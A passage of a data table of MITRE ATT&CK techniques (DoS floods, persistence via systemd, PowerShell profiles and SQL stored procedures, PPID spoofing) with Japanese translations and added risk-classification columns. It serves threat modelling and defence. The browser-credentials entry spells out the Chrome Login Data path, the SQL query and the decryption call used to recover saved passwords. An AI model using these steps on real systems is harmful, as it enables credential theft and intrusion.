T1499.001,T1499,OS Exhaustion Flood,OS枯渇フラッド,"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes. Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood) ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",攻撃者は、エンドポイントのオペレーティングシステム（OS）を標的としたサービス拒否（DoS）攻撃を仕掛ける可能性がある。システムのOSは、有限なリソースを管理するとともに、過剰な要求によってシステム全体が機能不全に陥るのを防ぐ役割を担っている。これらの攻撃は、システム上の実際のリソースを枯渇させる必要はなく、OSが自ら課す制限や利用可能なリソースを単に使い果たすだけで成立する。 これを達成する方法は複数存在し、SYNフラッドやACKフラッドなどのTCP状態枯渇攻撃が含まれる。（出典：Arbor AnnualDoSreport Jan 2018）SYNフラッドでは過剰なSYNパケットが送信されるが、3ウェイTCPハンドシェイクは決して完了しない。 各OSが許可する同時TCP接続数には上限があるため、これによりシステムが新たなTCP接続要求を受け付ける能力が急速に枯渇し、サーバーが提供するあらゆるTCPサービスへのアクセスが妨げられる。(引用元: Cloudflare SynFlood) ACKフラッドはTCPプロトコルのステートフルな性質を利用する。 ターゲットに対してACKパケットの洪水が送られます。これによりOSは、既に確立されている関連するTCP接続をステートテーブル内で検索せざるを得なくなります。ACKパケットは存在しない接続宛てであるため、OSは一致する接続が存在しないことを確認するためにステートテーブル全体を検索する必要があります。 大量のパケットに対してこの処理が必要になると、不正なACKパケットを除去するための作業負荷により、サーバーの動作が鈍化したり応答しなくなったりする可能性があります。これにより、標的となるサービスを提供するための利用可能なリソースが大幅に減少します。（引用元：Corero SYN-ACKflood）,impact,Linux;macOS;Windows,destructive_impact,impact,cloud_control_plane,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7,2020-02-20T15:27:18.581Z,2025-04-15T22:53:56.462Z,,,,
T1499.002,T1499,Service Exhaustion Flood,サービス枯渇フラッド,"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service. One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood) Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)",攻撃者はシステムが提供する各種ネットワークサービスを標的とし、サービス拒否（DoS）攻撃を仕掛ける。DNSやWebサービスの可用性が標的となることが多いが、他のサービスも標的とされる。(出典: Arbor AnnualDoSreport Jan 2018)Webサーバーソフトウェアは多様な手段で攻撃可能であり、汎用的な手法もあれば、サービス提供に使用されるソフトウェア固有の手法もある。 この種の攻撃の一例として、単純なHTTPフラッド攻撃が挙げられる。これは攻撃者がWebサーバーに対して大量のHTTPリクエストを送信し、サーバー自体および/またはその上で動作するアプリケーションを機能不全に陥らせるものである。このフラッド攻撃は、単純なリクエスト量で目的を達成し、被害ソフトウェアがサービス提供に必要な各種リソースを枯渇させる。(出典: Cloudflare HTTPflood) 別の変種であるSSL再ネゴシエーション攻撃は、SSL/TLSのプロトコル特性を悪用します。SSL/TLSプロトコルスイートには、クライアントとサーバーが後続の安全な接続に使用する暗号化アルゴリズムを合意するためのメカニズムが含まれています。SSL再ネゴシエーションが有効な場合、暗号アルゴリズムの再ネゴシエーションを要求することが可能です。 再ネゴシエーション攻撃では、攻撃者はSSL/TLS接続を確立した後、一連の再ネゴシエーション要求を送信します。暗号再ネゴシエーションには計算サイクルにおいて意味のあるコストがかかるため、これを大量に行うとサービスの可用性に影響を与える可能性があります。(引用: Arbor SSLDoS 2012年4月),impact,Windows;IaaS;Linux;macOS,destructive_impact,impact,network_connectivity;cloud_control_plane,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858,2020-02-20T15:31:43.613Z,2025-04-15T23:06:48.799Z,,,,
T1499.003,T1499,Application Exhaustion Flood,アプリケーション枯渇フラッド,"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",攻撃者は、アプリケーションのリソース集約的な機能を標的とし、サービス拒否（DoS）を引き起こすことで、それらのアプリケーションの利用を妨げることがあります。例えば、Webアプリケーションの特定の機能は、非常にリソース集約的である場合があります。それらの機能への繰り返しリクエストは、システムリソースを枯渇させ、アプリケーションまたはサーバー自体へのアクセスを拒否する可能性があります。（引用元：Arbor AnnualDoSreport Jan 2018）,impact,Windows;IaaS;Linux;macOS,destructive_impact,impact,,unknown,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9,2020-02-20T15:35:00.025Z,2025-04-15T21:48:39.804Z,,,,
T1499.004,T1499,Application or System Exploitation,アプリケーションまたはシステムの悪用,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition. Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",攻撃者は、アプリケーションやシステムをクラッシュさせ、ユーザーの利用を妨げるソフトウェアの脆弱性を悪用する可能性がある。（出典：Sucuri BIND9 2015年8月）クラッシュ発生時に重要なアプリケーションやサービスを自動再起動するシステムもあるが、再悪用され持続的なサービス拒否（DoS）状態を引き起こす可能性が高い。 攻撃者は既知またはゼロデイ脆弱性を悪用し、アプリケーションやシステムをクラッシュさせることがあり、これにより依存するアプリケーションやシステムもDoS状態に陥る可能性がある。クラッシュまたは再起動したアプリケーションやシステムは、[データ破壊](https://attack.mitre.org/techniques/T1485)、 [ファームウェア破損](https://attack.mitre.org/techniques/T1495)、[サービス停止](https://attack.mitre.org/techniques/T1489) など、さらなるDoS状態を引き起こし、重要な情報・アプリケーション・システムの可用性を阻害する可能性があります。,impact,Windows;IaaS;Linux;macOS,destructive_impact,impact,user_interaction,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0,2020-02-20T15:37:27.052Z,2025-04-15T21:50:12.334Z,,,,
T1500,,Compile After Delivery,配送後のコンパイル,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018) Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",攻撃者は、コンパイルされていないコードとしてファイルを被害者に配信することで、ペイロードの発見と分析を困難にしようとする可能性があります。 [難読化されたファイルや情報](https://attack.mitre.org/techniques/T1027)と同様に、テキストベースのソースコードファイルは、実行可能ファイル/バイナリを対象とした保護機能による分析や精査を回避する可能性があります。これらのペイロードは実行前にコンパイルが必要であり、通常はcsc.exeやGCC/MinGWなどのネイティブユーティリティを介して行われます。（出典：ClearSky MuddyWater 2018年11月）ソースコードペイロードは、暗号化・エンコードされるほか、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1193)として配信されるなど、他のファイル内に埋め込まれる場合もある。 ペイロードは、ネイティブOSにとって認識不能かつ本質的に無害な形式（例：macOS/Linux上のEXE）で配信され、後でバンドルされたコンパイラと実行フレームワークを用いて適切な実行可能バイナリに（再）コンパイルされる場合もある。(引用元: TrendMicro WindowsAppMac),defense-evasion,Linux;macOS;Windows,destructive_impact,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--cf7b3a06-8b42-4c33-bbe9-012120027925,2019-04-25T20:53:07.719Z,2025-04-25T15:16:11.353Z,,,,
T1501,,Systemd Service,Systemdサービス,"Systemd services can be used to establish persistence on a Linux system. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems. Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands. * ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. * ExecReload directive covers when a service restarts. * ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'. Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) While adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)",Systemdサービスは、Linuxシステム上で永続性を確立するために使用される。systemdサービスマネージャーは、バックグラウンドデーモンプロセス（サービスとも呼ばれる）やその他のシステムリソースの管理に一般的に使用される。（引用元：Linux man-pages: systemd January 2014）(引用元: Freedesktop.org Linux systemd 2018年9月29日)Systemdは、Debian 8、Ubuntu 15.04、CentOS 7、RHEL 7、Fedora 15以降、多くのLinuxディストリビューションでデフォルトの初期化(init)システムとして採用され、SysVinitやUpstartなどのレガシーinitシステムに取って代わると同時に、前述のinitシステムとの下位互換性を維持しています。 systemdは、サービスユニットと呼ばれる設定ファイルを利用して、サービスの起動方法や起動条件を制御します。デフォルトでは、これらのユニットファイルは<code>/etc/systemd/system</code>および<code>/usr/lib/systemd/system</code>ディレクトリに保存され、ファイル拡張子は<code>.service</code>です。各サービスユニットファイルには、システムコマンドを実行できる多数のディレクティブを含めることができます。 * ExecStart、ExecStartPre、ExecStartPostディレクティブは、サービスが'systemctl'で手動起動された場合、または自動起動設定時にシステム起動時にコマンドを実行する。 * ExecReloadディレクティブは、サービスが再起動される場合を扱います。* ExecStopおよびExecStopPostディレクティブは、サービスが停止される場合、または手動で'systemctl'によって停止される場合を扱います。攻撃者は、システム起動時などの繰り返し間隔でsystemdに悪意のあるコマンドを実行させるサービスユニットファイルを作成および/または改変することで、被害システムへの永続的なアクセスを確立するためにsystemdの機能を利用してきました。(引用元: Anomali Rocke 2019年3月)(引用元: gist Archパッケージ侵害 2018年7月10日)(引用元: Arch LinuxパッケージSystemd侵害 BleepingComputer 2018年7月10日)(引用元: acroreadパッケージ侵害 Arch Linux Mail 2018年7月8日) 攻撃者は通常、<code>/etc/systemd/system</code> および <code>/usr/lib/systemd/system</code> ディレクトリ内のサービスユニットファイルを作成/変更するには root 権限を必要としますが、低権限ユーザーは <code>~/.config/systemd/user/</code> などのディレクトリ内のサービスユニットファイルを作成/変更することで、ユーザーレベルの永続化を実現できます。(引用元: Rapid7 Service Persistence 2016年6月22日),persistence,Linux,script_command_execution,foothold,privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--0fff2797-19cb-41ea-a5f1-8a9303b8158e,2019-04-23T15:34:30.008Z,2025-04-25T15:15:09.246Z,,,,
T1502,,Parent PID Spoofing,親PIDスプーフィング,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018) Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA [Scripting](https://attack.mitre.org/techniques/T1064) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018) Explicitly assigning the PPID may also enable [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",攻撃者は、プロセス監視防御を回避したり権限昇格を行うために、新規プロセスの親プロセス識別子（PPID）を偽装する可能性があります。新規プロセスは、明示的に指定されない限り、通常は親プロセス（呼び出し元プロセス）から直接生成されます。新規プロセスのPPIDを明示的に割り当てる方法の一つは、使用するPPIDを定義するパラメータをサポートする<code>CreateProcess</code> API呼び出しです。(引用元: DidierStevens SelectMyParent 2009年11月) この機能は、ユーザー アカウント制御 (UAC) などの Windows 機能によって使用され、要求された昇格プロセスが SYSTEM (通常は <code>svchost.exe</code> または <code>consent.exe</code> 経由) によって生成された後、現在のユーザー コンテキストではなく正しい PPID を設定するために使用されます。(引用元: Microsoft UAC Nov 2018) 攻撃者はこれらのメカニズムを悪用し、防御策を回避する可能性があります。例えば、Office文書からの直接プロセス起動をブロックする防御や、[PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) のPPIDを<code>explorer.exe</code>と偽装するといった手法が挙げられる。(引用: CounterCept PPID Spoofing Dec 2018) この偽装は、悪意のあるOffice文書内のVBA[スクリプティング](https://attack.mitre.org/techniques/T1064)や、[ネイティブAPI](https://attack.mitre.org/techniques/T1106)を実行可能なあらゆるコードを通じて実行される可能性がある。(引用: CTD PPID Spoofing Macro 2019年3月)(引用: CounterCept PPID Spoofing 2018年12月) PPIDを明示的に割り当てることで、親プロセスへの適切なアクセス権限があれば[権限昇格](https://attack.mitre.org/tactics/TA0004)も可能となる。 例えば、特権ユーザーコンテキスト（管理者など）の攻撃者は、新しいプロセスを生成し、親プロセスをSYSTEMとして実行されているプロセス（<code>lsass.exe</code>など）に割り当て、継承されたアクセストークンを介して新しいプロセスを昇格させることができます。(引用: XPNSec PPID 2017年11月),defense-evasion;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;identity_federation;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--9ddc2534-e91c-4dab-a8f6-43dab81e8142,2019-06-03T14:50:50.613Z,2025-04-25T15:15:55.200Z,,,,
T1503,,Credentials from Web Browsers,Webブラウザからの認証情報,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser. (Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers. For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData April 2018) Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016) After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).","攻撃者は、対象ブラウザ固有のファイルを読み取ることで、Webブラウザから認証情報を取得する可能性がある。(引用: Talos Olympic Destroyer 2018) Webブラウザは通常、ウェブサイトユーザー名やパスワードなどの認証情報を保存し、将来の手動入力不要を実現する。Webブラウザは通常、認証情報を暗号化された形式で認証情報ストア内に保存するが、Webブラウザから平文の認証情報を抽出する手法が存在する。 例えばWindowsシステムでは、Google Chromeから暗号化された認証情報を取得するために、データベースファイル<code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code>を読み取り、SQLクエリ<code>SELECT action_url, username_value, password_value FROM logins;</code>を実行する。 平文のパスワードは、暗号化された認証情報をWindows API関数<code>CryptUnprotectData</code>に渡すことで取得できます。この関数は被害者のキャッシュされたログオン認証情報を復号鍵として使用します。 (引用元: Microsoft CryptUnprotectData 2018年4月) 攻撃者はFireFox、Safari、Edgeなどの主要ウェブブラウザに対しても同様の手法を実行している。(引用元: Proofpoint Vega Credential Stealer 2018年5月)(引用元: FireEye HawkEye Malware 2017年7月) 攻撃者はウェブブラウザのプロセスメモリをスキャンし、認証情報に一致するパターンを検索することで資格情報を取得することもある。(引用: GitHub Mimikittenz 2016年7月) ウェブブラウザから認証情報を取得した後、攻撃者はアクセス権限を拡大するため、異なるシステムやアカウント間で認証情報を流用しようとする可能性があります。ウェブブラウザから取得した認証情報が特権アカウント（例: ドメイン管理者）と重複する場合、これにより攻撃者の目的が大幅に達成される可能性があります。",credential-access,Linux;macOS;Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;database_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--4579d9c9-d5b9-45e0-9848-0104637b579f,2019-06-17T19:34:51.855Z,2025-04-25T15:15:28.073Z,,,,
T1504,,PowerShell Profile,PowerShellプロファイル,"Adversaries may gain persistence and elevate privileges in certain situations by abusing [PowerShell](https://attack.mitre.org/techniques/T1086) profiles. A PowerShell profile (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments. PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",攻撃者は特定の状況下で、[PowerShell](https://attack.mitre.org/techniques/T1086)プロファイルを悪用することで永続化や権限昇格を実現する可能性があります。PowerShellプロファイル（<code>profile.ps1</code>）はPowerShell起動時に実行されるスクリプトであり、ユーザー環境をカスタマイズするログオンスクリプトとして使用できます。 PowerShellは、ユーザーやホストプログラムに応じて複数のプロファイルをサポートしています。例えば、PowerShellコンソール、PowerShell ISE、Visual Studio CodeなどのPowerShellホストプログラムごとに異なるプロファイルが存在します。管理者は、ローカルコンピュータ上の全ユーザーとホストプログラムに適用されるプロファイルを設定することも可能です。（引用元: Microsoft About Profiles）攻撃者は、これらのプロファイルを改変し、任意のコマンド、関数、モジュール、および/またはPowerShellドライブを含めることで永続性を獲得する可能性があります。 ユーザーがPowerShellセッションを開くたびに、起動時に<code>-NoProfile</code>フラグが使用されない限り、改変されたスクリプトが実行されます。 （引用元：ESET Turla PowerShell May 2019）また、PowerShellプロファイル内のスクリプトが、ドメイン管理者などより高い権限を持つアカウントによって読み込まれ実行された場合、攻撃者は権限昇格が可能となる可能性があります。（引用元：Wits End and Shady PowerShell Profiles）,persistence;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--723e3a2b-ca0d-4daa-ada8-82ea35d3733a,2019-06-14T18:53:49.472Z,2025-04-25T15:15:43.586Z,,,,
T1505,,Server Software Component,サーバーソフトウェアコンポーネント,Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW),攻撃者は、サーバーの正当な拡張開発機能を悪用し、システムへの永続的なアクセスを確立する可能性があります。エンタープライズサーバーアプリケーションには、開発者がメインアプリケーションの機能を拡張するためのソフトウェアやスクリプトを記述・インストールできる機能が含まれている場合があります。攻撃者は、サーバーアプリケーションを拡張・悪用するために悪意のあるコンポーネントをインストールする可能性があります。(引用元: volexity_0day_sophos_FW),persistence,Windows;Linux;macOS;Network Devices;ESXi,script_command_execution,foothold,endpoint_execution,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb,2019-06-28T17:52:07.296Z,2025-04-16T20:37:21.713Z,,,,
T1505.001,T1505,SQL Stored Procedures,SQLストアドプロシージャ,"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted). Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)",攻撃者はSQLストアドプロシージャを悪用し、システムへの永続的なアクセスを確立する可能性があります。SQLストアドプロシージャは保存・再利用可能なコードであり、データベースユーザーが頻繁に使用するSQLクエリを書き直す手間を省きます。ストアドプロシージャは、プロシージャ名を用いたデータベースへのSQL文経由、または定義済みイベント（例：SQLサーバーアプリケーションの起動/再起動時）経由で呼び出せます。 攻撃者は、SQLデータベースサーバーに永続化メカニズムを提供する悪意のあるストアドプロシージャを作成する可能性があります。(引用: NetSPI Startup Stored Procedures)(引用: Kaspersky MSSQL Aug 2019) SQL構文を通じてオペレーティングシステムコマンドを実行するには、攻撃者は追加機能（例: MSSQL Serverのxp_cmdshell）を有効化する必要がある場合があります。(引用: NetSPI Startup Stored Procedures)(引用: Kaspersky MSSQL Aug 2019)(引用: Microsoft xp_cmdshell 2017) Microsoft SQL Server は、共通言語ランタイム (CLR) 統合を有効化できます。 CLR 統合を有効にすると、アプリケーション開発者は、任意の .NET Framework 言語（VB .NET、C# など）を使用してストアドプロシージャを記述できます。(引用: Microsoft CLR Integration 2017) これらの CLR アセンブリは任意のコマンドを実行させることができるため、攻撃者は、ストアドプロシージャにリンクされている CLR アセンブリを作成または変更する可能性があります。(引用: NetSPI SQL Server CLR),persistence,Windows;Linux,script_command_execution,foothold,user_interaction;endpoint_execution;database_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--f9e9365a-9ca2-4d9c-8e7c-050d73d1101a,2019-12-12T14:59:58.168Z,2025-04-15T23:02:13.653Z,,,,
T1505.002,T1505,Transport Agent,トランスポートエージェント,"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",攻撃者は、Microsoft トランスポートエージェントを悪用してシステムへの永続的なアクセスを確立する可能性があります。Microsoft Exchange トランスポートエージェントは、トランスポートパイプラインを通過する電子メールメッセージに対して動作し、スパムフィルタリング、悪意のある添付ファイルのフィルタリング、ジャーナリング、またはすべての送信メールの末尾に企業署名を追加するなどの様々なタスクを実行できます。(引用元: Microsoft TransportAgent Jun 2016)(引用元: ESET LightNeuron 2019年5月)トランスポートエージェントはアプリケーション開発者が作成し、.NETアセンブリにコンパイルされた後、Exchangeサーバーに登録される。トランスポートエージェントはメール処理の指定段階で呼び出され、開発者が定義したタスクを実行する。攻撃者は悪意のあるトランスポートエージェントを登録し、攻撃者が指定したメールイベントによってトリガーされるExchangeサーバー内の永続化メカニズムを提供できる。(引用元: ESET LightNeuron 2019年5月) 悪意のあるトランスポートエージェントはExchangeトランスポートパイプラインを通過する全メールに対して呼び出される可能性があるが、攻撃者が定義した基準に応じた特定のタスクのみを実行するよう設定することも可能である。例えば、受信者メールアドレスが攻撃者が提供するリストの項目と一致する場合に限り、送信中の添付ファイルをコピーして後日の情報漏洩用に保存するといったアクションを実行する設定が可能である。,persistence,Linux;Windows,data_exfiltration,foothold,user_interaction;endpoint_execution;email_infrastructure,specified,Business Workstation;Mail / Collaboration;Server 